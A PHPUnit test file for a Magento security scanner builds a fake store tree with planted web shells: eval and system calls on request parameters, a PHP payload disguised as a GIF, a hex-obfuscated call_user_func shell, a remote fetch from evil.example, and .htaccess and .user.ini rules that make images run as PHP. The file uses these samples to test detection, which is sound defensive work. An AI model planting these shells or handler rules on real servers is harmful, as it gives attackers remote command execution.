<?php

declare(strict_types=1);

namespace DockCodes\DockRay\Test\Unit\Model\Security;

use DockCodes\DockRay\Model\Security\ReportBuilder;
use DockCodes\DockRay\Model\Security\SecurityScanner;
use PHPUnit\Framework\TestCase;

/**
 * The security report built from a synthetic Magento tree with planted
 * traces, checked against the rules DockRay's ingest applies
 * (`SecurityReportIngest::validate()`): one invalid path or key there fails
 * the whole report.
 */
final class ReportBuilderTest extends TestCase
{
    /** Rules of DockRay's ingest, `app/Services/Security/SecurityReportIngest.php`. */
    private const GROUP_TYPES = ['core', 'plugin', 'theme', 'module', 'component', 'template', 'library', 'package', 'app'];

    private const FILE_ROLES = ['entry', 'config', 'server', 'mu_plugin', 'dropin'];

    private const SUSPICIOUS_KINDS = ['php_in_uploads', 'php_in_media', 'hidden_directory', 'unknown_root_php', 'suspicious_code'];

    private const POSTURE_KEYS = ['code_writable', 'file_mods_disabled', 'file_edit_disabled', 'display_errors', 'exec_available', 'debug_mode', 'debug_tools', 'dev_mode'];

    /** Magento's own pub/media/.htaccess (2.4), the part that matters: it stops PHP there. */
    private const STOCK_MEDIA_HTACCESS = <<<'HTACCESS'
Options -Indexes

<IfModule mod_php7.c>
    php_flag engine 0
</IfModule>

<IfModule mod_php.c>
    php_flag engine 0
</IfModule>

AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi
Options -ExecCGI

<FilesMatch ".*\.(ph(p[3457]?|t|tml)|[aj]sp|p[ly]|sh|cgi|shtml?|html?)$">
SetHandler default-handler
</FilesMatch>

AddType application/javascript js jsonp
AddType image/jpeg jpg
HTACCESS;

    private string $root;

    protected function setUp(): void
    {
        parent::setUp();
        $this->root = sys_get_temp_dir().'/dockray-magento-security-'.bin2hex(random_bytes(8));
        $installed = [
            'packages' => [
                ['name' => 'magento/framework', 'version' => '103.0.7', 'type' => 'magento2-library', 'install-path' => '../magento/framework'],
                ['name' => 'acme/module-pay', 'version' => 'dev-main', 'type' => 'magento2-module', 'install-path' => '../acme/module-pay',
                    'source' => ['type' => 'git', 'reference' => 'abcdef1234567890abcdef1234567890abcdef12']],
                ['name' => 'magento/product-community-edition', 'version' => '2.4.7', 'type' => 'metapackage', 'install-path' => null],
                ['name' => 'acme/local-copy', 'version' => '1.0.0', 'type' => 'magento2-module', 'install-path' => '../../app/code/Acme/Custom'],
                ['name' => 'evil/escape', 'version' => '1.0.0', 'install-path' => '../../../../etc'],
            ],
            'dev' => false,
            'dev-package-names' => [],
        ];
        $files = [
            // Composer
            'vendor/composer/installed.json' => (string) json_encode($installed),
            'vendor/composer/autoload_classmap.php' => '<?php return [];',
            'vendor/autoload.php' => '<?php // generated',
            'vendor/magento/framework/App/Http.php' => '<?php class Http {}',
            'vendor/magento/framework/view/base.js' => 'define([], function () {});',
            'vendor/magento/framework/README.md' => 'not part of the digest',
            'vendor/acme/module-pay/Model/Pay.php' => '<?php class Pay {}',
            // Local code
            'app/code/Acme/Custom/registration.php' => '<?php // register',
            'app/code/Acme/Custom/etc/module.xml' => '<?xml version="1.0"?><config><module name="Acme_Custom" setup_version="1.2.0"/></config>',
            'app/code/Acme/Custom/Model/Thing.php' => '<?php class Thing {}',
            'app/design/frontend/Acme/shop/registration.php' => '<?php // register',
            'app/design/frontend/Acme/shop/theme.xml' => '<theme/>',
            'app/design/frontend/Acme/shop/composer.json' => '{"version": "2.0.0"}',
            'app/design/frontend/Acme/shop/Magento_Theme/templates/html/header.phtml' => '<header></header>',
            // magento2-base copies
            'lib/web/mage/requirejs/mixins.js' => 'define([]);',
            'setup/src/Magento/Setup/Application.php' => '<?php class Application {}',
            'pub/errors/processor.php' => '<?php class Processor {}',
            // Entry, configuration and server files
            'index.php' => '<?php require __DIR__."/app/bootstrap.php";',
            'pub/index.php' => '<?php require __DIR__."/../app/bootstrap.php";',
            'pub/get.php' => '<?php // media',
            'pub/static.php' => '<?php @eval($_POST["x"]);',
            'pub/cron.php' => '<?php // cron',
            'pub/health_check.php' => '<?php // health',
            'app/bootstrap.php' => '<?php error_reporting(E_ALL);',
            'app/etc/env.php' => "<?php return ['crypt' => ['key' => 'not-a-real-secret']];",
            'app/etc/config.php' => "<?php return ['modules' => []];",
            'bin/magento' => '#!/usr/bin/env php',
            '.htaccess' => 'RewriteEngine on',
            'pub/.htaccess' => 'DirectoryIndex index.php',
            'pub/.user.ini' => 'memory_limit = 756M',
            'pub/media/.htaccess' => self::STOCK_MEDIA_HTACCESS,
            // Planted in the web roots
            'info.php' => '<?php phpinfo();',
            'c:evil.php' => '<?php echo 1;',
            'pub/x.php' => '<?php echo file_get_contents("https://evil.example/p.txt");',
            // Planted in pub/media
            'pub/media/index.php' => "<?php\n// Silence is golden.\n",
            'pub/media/wysiwyg/shell.php' => '<?php @eval($_POST["x"]);',
            "pub/media/..\\x.php" => '<?php system($_GET["c"]);',
            'pub/media/catalog/product/a/b/photo.jpg' => "GIF89a<?php system(\$_GET['c']); ?>",
            'pub/media/catalog/product/a/b/real.jpg' => "\xFF\xD8\xFF\xE0 plain image",
            'pub/media/catalog/product/cache/0f/a/b/resized.jpg' => "\xFF\xD8\xFF\xE0 resized",
            'pub/media/tmp/x.phtml' => "<?php \$f = chr(115).chr(121).chr(115).chr(116); call_user_func(pack('H*', '73797374656d'), \$_REQUEST['c']);",
            'pub/media/tmp/.user.ini' => "auto_prepend_file=/tmp/x.jpg\n",
            'pub/media/import/.htaccess' => "<FilesMatch \"\\.jpg$\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n",
            'pub/media/customer/.htaccess' => "Deny from all\n",
            'pub/media/theme_customization/.htaccess' => "<Files ~ \"\\.xml$\">\n    Deny from all\n</Files>\n",
            'pub/media/.cache/x.txt' => 'hidden',
            'pub/media/.well-known/acme' => 'ok',
            'pub/media/.renditions/wysiwyg/banner.jpg' => "\xFF\xD8\xFF\xE0 rendition",
            'pub/media/.thumbs/wysiwyg/banner.jpg' => "\xFF\xD8\xFF\xE0 thumbnail",
            // Regenerated, never part of the report
            'generated/code/Magento/Framework/App/Http/Interceptor.php' => '<?php class Interceptor {}',
            'pub/static/frontend/Magento/luma/en_US/requirejs-config.js' => 'var config = {};',
            'var/cache/mage--0/x' => 'cache',
        ];

        foreach ($files as $path => $contents) {
            $this->put($path, $contents);
        }
    }

    protected function tearDown(): void
    {
        $files = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($this->root, \FilesystemIterator::SKIP_DOTS), \RecursiveIteratorIterator::CHILD_FIRST);

        foreach ($files as $file) {
            $file->isDir() && ! $file->isLink() ? rmdir($file->getPathname()) : unlink($file->getPathname());
        }

        rmdir($this->root);
        parent::tearDown();
    }

    public function testPayloadSatisfiesTheIngestRulesAndCarriesNoContentsOrAbsolutePaths(): void
    {
        $built = (new ReportBuilder())->build($this->root, $this->context(), [], time(), 20.0);
        $payload = $built['payload'];
        $json = (string) json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE);

        $this->assertSame([], self::violations($payload));
        $this->assertLessThanOrEqual(2097152, strlen($json));
        $this->assertStringNotContainsString($this->root, $json);
        $this->assertStringNotContainsString('not-a-real-secret', $json);
        $this->assertStringNotContainsString('eval(', $json);
        $this->assertStringNotContainsString('system(', $json);
        $this->assertStringNotContainsString('<?php', $json);

        $this->assertSame(1, $payload['schema']);
        $this->assertSame('magento', $payload['platform']);
        $this->assertSame('2.4.7', $payload['platform_version']);
        $this->assertSame('1.1.0', $payload['agent_version']);
        $this->assertSame('https://shop.example.com', $payload['site_url']);
        $this->assertFalse($payload['scan']['truncated']);
        $this->assertGreaterThan(0, $payload['scan']['files']);
    }

    public function testGroupsCoverCoreLocalCodeAndComposerPackages(): void
    {
        $payload = (new ReportBuilder())->build($this->root, $this->context(), [], time(), 20.0)['payload'];
        $groups = [];

        foreach ($payload['groups'] as $group) {
            $groups[$group['type'].':'.$group['slug']] = $group;
        }

        // Metapackages, packages installed into app/ and paths leaving vendor/ are not groups.
        $this->assertSame([
            'core:magento', 'module:Acme_Custom', 'theme:frontend/Acme/shop', 'package:acme/module-pay', 'package:magento/framework',
        ], array_keys($groups));

        $this->assertSame('2.4.7', $groups['core:magento']['version']);
        $this->assertSame(3, $groups['core:magento']['files']);
        $this->assertSame('1.2.0', $groups['module:Acme_Custom']['version']);
        $this->assertSame('2.0.0', $groups['theme:frontend/Acme/shop']['version']);
        // A branch is versioned by its commit, so `composer update` of it is an update.
        $this->assertSame('dev-main#abcdef123456', $groups['package:acme/module-pay']['version']);
        $this->assertSame('103.0.7', $groups['package:magento/framework']['version']);

        // Paths relative to the package root, only code extensions, sorted byte-wise.
        $this->assertSame(2, $groups['package:magento/framework']['files']);
        $this->assertSame(self::digest([
            'App/Http.php' => hash('sha256', '<?php class Http {}'),
            'view/base.js' => hash('sha256', 'define([], function () {});'),
        ]), $groups['package:magento/framework']['digest']);
        $this->assertSame(self::digest([
            'Model/Thing.php' => hash('sha256', '<?php class Thing {}'),
            'registration.php' => hash('sha256', '<?php // register'),
        ]), $groups['module:Acme_Custom']['digest']);

        // A release set in the settings re-baselines local code with every deployment.
        $released = (new ReportBuilder())->build($this->root, ['release' => 'r42'] + $this->context(), [], time(), 20.0)['payload'];
        $versions = array_column($released['groups'], 'version', 'slug');
        $this->assertSame('1.2.0+r42', $versions['Acme_Custom']);
        $this->assertSame('2.0.0+r42', $versions['frontend/Acme/shop']);
        $this->assertSame('103.0.7', $versions['magento/framework']);
    }

    public function testSensitiveFilesAreHashedWithTheirRoles(): void
    {
        $payload = (new ReportBuilder())->build($this->root, $this->context(), [], time(), 20.0)['payload'];

        $this->assertSame([
            'index.php' => 'entry', 'pub/index.php' => 'entry', 'pub/get.php' => 'entry', 'pub/static.php' => 'entry',
            'pub/cron.php' => 'entry', 'pub/health_check.php' => 'entry', 'app/bootstrap.php' => 'entry', 'bin/magento' => 'entry',
            'app/etc/env.php' => 'config', 'app/etc/config.php' => 'config',
            '.htaccess' => 'server', 'pub/.htaccess' => 'server', 'pub/.user.ini' => 'server', 'pub/media/.htaccess' => 'server',
        ], array_column($payload['files'], 'role', 'path'));

        $env = array_values(array_filter($payload['files'], static fn (array $file): bool => $file['path'] === 'app/etc/env.php'))[0];
        $this->assertSame(hash_file('sha256', $this->root.'/app/etc/env.php'), $env['sha256']);
        $this->assertSame(filesize($this->root.'/app/etc/env.php'), $env['size']);
    }

    public function testPlantedTracesAreReportedAndStockMagentoIsNot(): void
    {
        $payload = (new ReportBuilder())->build($this->root, $this->context(), [], time(), 20.0)['payload'];
        $suspicious = [];

        foreach ($payload['suspicious'] as $entry) {
            $suspicious[$entry['path']] = [$entry['kind'], $entry['indicators'] ?? []];
        }

        ksort($suspicious, SORT_STRING);

        $this->assertSame([
            'c?evil.php' => ['unknown_root_php', []],
            'info.php' => ['unknown_root_php', []],
            // Regression: a backslash is a file name character on Linux. Turned
            // into "/" it made `pub/media/../x.php`, and DockRay rejected the
            // whole report.
            'pub/media/..?x.php' => ['php_in_uploads', ['request_exec', 'shell_exec']],
            'pub/media/.cache' => ['hidden_directory', []],
            'pub/media/catalog/product/a/b/photo.jpg' => ['php_in_media', ['request_exec', 'shell_exec']],
            'pub/media/import/.htaccess' => ['suspicious_code', ['php_handler']],
            'pub/media/tmp/.user.ini' => ['suspicious_code', ['php_handler']],
            'pub/media/tmp/x.phtml' => ['php_in_uploads', ['obfuscated_call', 'chr_obfuscation']],
            'pub/media/wysiwyg/shell.php' => ['php_in_uploads', ['eval', 'request_exec']],
            'pub/static.php' => ['suspicious_code', ['eval', 'request_exec']],
            'pub/x.php' => ['unknown_root_php', ['remote_fetch']],
        ], $suspicious);

        // Magento's own pub/media/.htaccess (`AddHandler cgi-script .php`, `php_flag engine 0`),
        // its hidden thumbnail and rendition directories and the resized image cache are not findings.
        $this->assertArrayNotHasKey('pub/media/.htaccess', $suspicious);
        $this->assertArrayNotHasKey('pub/media/.renditions', $suspicious);
        $this->assertArrayNotHasKey('pub/media/.thumbs', $suspicious);

        foreach ($payload['suspicious'] as $entry) {
            if ($entry['kind'] !== 'hidden_directory') {
                $this->assertIsInt($entry['size']);
                $this->assertIsInt($entry['mtime']);
            }
        }
    }

    public function testPostureCarriesTheGivenValuesAndDetectsDebugTools(): void
    {
        $payload = (new ReportBuilder())->build($this->root, $this->context(), [], time(), 20.0)['payload'];
        $this->assertSame(['display_errors' => false, 'exec_available' => true, 'dev_mode' => false, 'debug_tools' => false], $payload['posture']);

        $this->put('app/code/ADM/QuickDevBar/registration.php', '<?php // register');
        $payload = (new ReportBuilder())->build($this->root, $this->context(), [], time(), 20.0)['payload'];
        $this->assertTrue($payload['posture']['debug_tools']);
    }

    public function testRuntimePostureMeasuresOnlyTheSapiDependentKeys(): void
    {
        $posture = ReportBuilder::runtimePosture($this->root);

        $this->assertSame(['code_writable', 'display_errors', 'exec_available'], array_keys($posture));
        $this->assertSame(ReportBuilder::RUNTIME_POSTURE, array_keys($posture));
        $this->assertTrue($posture['code_writable']);

        // Without any code directory there is nothing to judge.
        $this->assertArrayNotHasKey('code_writable', ReportBuilder::runtimePosture($this->root.'/pub/errors'));
    }

    public function testAScanStoppedAtItsLimitIsTruncatedAndListsOnlyCompleteGroups(): void
    {
        // 23 entry, configuration and web root files, then 3 core files and 3 of the
        // module: the theme (4 files) no longer fits.
        $payload = (new ReportBuilder())->build($this->root, $this->context(), [], time(), 20.0, 30)['payload'];

        $this->assertTrue($payload['scan']['truncated']);
        $this->assertSame([], self::violations($payload));

        // Every listed group was hashed in full: same digest as an unlimited scan.
        $full = array_column((new ReportBuilder())->build($this->root, $this->context(), [], time(), 20.0)['payload']['groups'], 'digest', 'slug');

        foreach ($payload['groups'] as $group) {
            $this->assertSame($full[$group['slug']], $group['digest']);
        }

        $this->assertSame(['magento', 'Acme_Custom'], array_column($payload['groups'], 'slug'));
        $this->assertLessThan(count($full), count($payload['groups']));
    }

    public function testHashCacheKeepsDigestsStableAndNoticesAModifiedFile(): void
    {
        $builder = new ReportBuilder();
        $first = $builder->build($this->root, $this->context(), [], time(), 20.0);
        $second = $builder->build($this->root, $this->context(), $first['cache'], time(), 20.0);
        $this->assertSame($first['payload']['groups'], $second['payload']['groups']);
        $this->assertArrayHasKey('vendor/magento/framework/App/Http.php', $first['cache']['hashes']);
        $this->assertArrayNotHasKey('vendor/composer/autoload_classmap.php', $first['cache']['hashes']);

        // Same size, same mtime: only ctime (which PHP cannot set) gives the change away.
        $file = $this->root.'/vendor/magento/framework/App/Http.php';
        $mtime = (int) filemtime($file);
        sleep(1);
        file_put_contents($file, '<?php class Htt2 {}');
        touch($file, $mtime);
        clearstatcache();
        $third = $builder->build($this->root, $this->context(), $second['cache'], time(), 20.0);
        $digests = array_column($third['payload']['groups'], 'digest', 'slug');
        $this->assertNotSame(array_column($first['payload']['groups'], 'digest', 'slug')['magento/framework'], $digests['magento/framework']);
    }

    public function testUploadScanIsIncrementalButKeepsEarlierFindings(): void
    {
        $builder = new ReportBuilder();
        $now = time();
        $first = $builder->build($this->root, $this->context(), [], $now, 20.0);
        $this->assertSame(['pub/media/catalog/product/a/b/photo.jpg'], array_keys($first['cache']['uploads']['known']));

        // Later the same week: unchanged media is not read again, yet the
        // disguised script found before is carried over by its unchanged ctime.
        $later = $now + 1000;
        $cache = $first['cache'];
        $cache['uploads'] = ['since' => $later, 'full_at' => $later] + $cache['uploads'];
        $second = $builder->build($this->root, $this->context(), $cache, $later + 60, 20.0);
        $this->assertEqualsCanonicalizing($first['payload']['suspicious'], $second['payload']['suspicious']);
        $this->assertSame($later + 60, $second['cache']['uploads']['since']);
    }

    public function testPathsAreMadeValidInsteadOfFailingTheReport(): void
    {
        $this->assertSame('pub/media/..?x.php', SecurityScanner::path("pub/media/..\\x.php"));
        $this->assertSame('pub/media/a?b.php', SecurityScanner::path("pub/media/a\nb.php"));
        // A leading drive letter fails the whole report on the server.
        $this->assertSame('c?evil.php', SecurityScanner::path('c:evil.php'));
        $this->assertSame('C?evil.php', SecurityScanner::path('C:evil.php'));
        $this->assertSame('pub/C:x.php', SecurityScanner::path('pub/C:x.php'));
        $this->assertSame(512, strlen((string) SecurityScanner::path('pub/media/'.str_repeat('a', 600).'.php')));
        // Cutting a long path must not leave a `..` segment behind.
        $this->assertNull(SecurityScanner::path(str_repeat('a/', 255).'..x'));

        foreach (["pub/media/..\\x.php", "a\x7fb", 'c:evil.php', 'pub/media/'.str_repeat('ü', 400)] as $path) {
            $this->assertTrue(SecurityScanner::isRelativePath((string) SecurityScanner::path($path)), $path);
        }
    }

    public function testStockMagentoMediaHtaccessIsNotAPhpHandler(): void
    {
        $scanner = new SecurityScanner($this->root, [], microtime(true) + 10, 1000);
        $entries = $scanner->uploads(['pub/media'], [], time(), 10.0, 1000)['entries'];
        $this->assertNotContains('pub/media/.htaccess', array_column($entries, 'path'));

        foreach ([
            'AddType application/x-httpd-php .jpg' => true,
            'AddHandler application/x-httpd-php5 .gif' => true,
            'AddHandler php-script .png' => true,
            'SetHandler "proxy:unix:/run/php/php8.3-fpm.sock|fcgi://localhost"' => true,
            "<FilesMatch \"\\.gif$\">\nForceType application/x-httpd-php\n</FilesMatch>" => true,
            'php_value auto_prepend_file /tmp/x' => true,
            'php_flag engine on' => true,
            'AddHandler cgi-script .php .pl' => false,
            'AddType text/plain .php' => false,
            'SetHandler default-handler' => false,
            'php_flag engine 0' => false,
        ] as $rules => $handler) {
            $this->put('pub/media/probe/.htaccess', $rules);
            $scanner = new SecurityScanner($this->root, [], microtime(true) + 10, 1000);
            $paths = array_column($scanner->uploads(['pub/media/probe'], [], time(), 10.0, 1000)['entries'], 'path');
            $this->assertSame($handler, in_array('pub/media/probe/.htaccess', $paths, true), $rules);
        }
    }

    /** @return array<string, mixed> */
    private function context(): array
    {
        return [
            'platform_version' => '2.4.7',
            'site_url' => 'https://shop.example.com',
            'agent_version' => '1.1.0',
            'release' => null,
            'posture' => ['display_errors' => false, 'exec_available' => true, 'dev_mode' => false],
        ];
    }

    private function put(string $path, string $contents): void
    {
        $file = $this->root.'/'.$path;

        if (! is_dir(dirname($file))) {
            mkdir(dirname($file), 0700, true);
        }

        file_put_contents($file, $contents);
    }

    /** @param array<string, string> $hashes */
    private static function digest(array $hashes): string
    {
        uksort($hashes, 'strcmp');
        $data = '';

        foreach ($hashes as $path => $hash) {
            $data .= $path."\0".$hash."\n";
        }

        return hash('sha256', $data);
    }

    /**
     * What `SecurityReportIngest::validate()` would reject, as a list of
     * messages - empty when the report is accepted.
     *
     * @param array<string, mixed> $payload
     *
     * @return list<string>
     */
    private static function violations(array $payload): array
    {
        $errors = [];
        $digest = '/^[a-fA-F0-9]{64}$/D';
        $check = static function (bool $ok, string $message) use (&$errors): void {
            if (! $ok) {
                $errors[] = $message;
            }
        };

        $check(($payload['schema'] ?? null) === 1, 'schema');
        $check(($payload['platform'] ?? null) === 'magento', 'platform');
        $check(! isset($payload['platform_version']) || (is_string($payload['platform_version']) && mb_strlen($payload['platform_version']) <= 64), 'platform_version');
        $check(! isset($payload['php_version']) || (is_string($payload['php_version']) && mb_strlen($payload['php_version']) <= 64), 'php_version');
        $check(! isset($payload['agent_version']) || (is_string($payload['agent_version']) && mb_strlen($payload['agent_version']) <= 32), 'agent_version');
        $check(! isset($payload['site_url']) || (is_string($payload['site_url']) && mb_strlen($payload['site_url']) <= 2048), 'site_url');
        $check(is_int($payload['scan']['files'] ?? null) && $payload['scan']['files'] >= 0, 'scan.files');
        $check(is_int($payload['scan']['duration_ms'] ?? null) && $payload['scan']['duration_ms'] >= 0, 'scan.duration_ms');
        $check(is_bool($payload['scan']['truncated'] ?? null), 'scan.truncated');
        $check(! isset($payload['core']), 'core is WordPress only');

        $check(is_array($payload['groups']) && count($payload['groups']) <= 1500, 'groups');

        foreach ($payload['groups'] as $i => $group) {
            $check(in_array($group['type'] ?? null, self::GROUP_TYPES, true), "groups.$i.type");
            $check(is_string($group['slug'] ?? null) && mb_strlen($group['slug']) <= 191 && preg_match('/^[A-Za-z0-9._@\/+-]+$/', $group['slug']) === 1, "groups.$i.slug");
            $check(! isset($group['version']) || (is_string($group['version']) && mb_strlen($group['version']) <= 64), "groups.$i.version");
            $check(! isset($group['files']) || (is_int($group['files']) && $group['files'] >= 0), "groups.$i.files");
            $check(is_string($group['digest'] ?? null) && preg_match($digest, $group['digest']) === 1, "groups.$i.digest");
        }

        $check(is_array($payload['files']) && count($payload['files']) <= 500, 'files');

        foreach ($payload['files'] as $i => $file) {
            $check(is_string($file['path'] ?? null) && mb_strlen($file['path']) <= 512 && SecurityScanner::isRelativePath($file['path']), "files.$i.path");
            $check(in_array($file['role'] ?? null, self::FILE_ROLES, true), "files.$i.role");
            $check(is_string($file['sha256'] ?? null) && preg_match($digest, $file['sha256']) === 1, "files.$i.sha256");
            $check(! isset($file['size']) || (is_int($file['size']) && $file['size'] >= 0), "files.$i.size");
        }

        $check(is_array($payload['suspicious']) && count($payload['suspicious']) <= 500, 'suspicious');

        foreach ($payload['suspicious'] as $i => $entry) {
            $check(is_string($entry['path'] ?? null) && mb_strlen($entry['path']) <= 512 && SecurityScanner::isRelativePath($entry['path']), "suspicious.$i.path");
            $check(in_array($entry['kind'] ?? null, self::SUSPICIOUS_KINDS, true), "suspicious.$i.kind");
            $check(! isset($entry['indicators']) || (is_array($entry['indicators']) && count($entry['indicators']) <= 10), "suspicious.$i.indicators");

            foreach ($entry['indicators'] ?? [] as $indicator) {
                $check(is_string($indicator) && strlen($indicator) <= 32 && preg_match('/^[a-z0-9_]+$/D', $indicator) === 1, "suspicious.$i.indicators.*");
            }

            $check(! isset($entry['size']) || (is_int($entry['size']) && $entry['size'] >= 0), "suspicious.$i.size");
            $check(! isset($entry['mtime']) || (is_int($entry['mtime']) && $entry['mtime'] >= 0), "suspicious.$i.mtime");
        }

        foreach ($payload['posture'] as $key => $value) {
            $check(in_array($key, self::POSTURE_KEYS, true), "posture.$key unknown to the server");
            $check(is_bool($value), "posture.$key");
        }

        return $errors;
    }
}
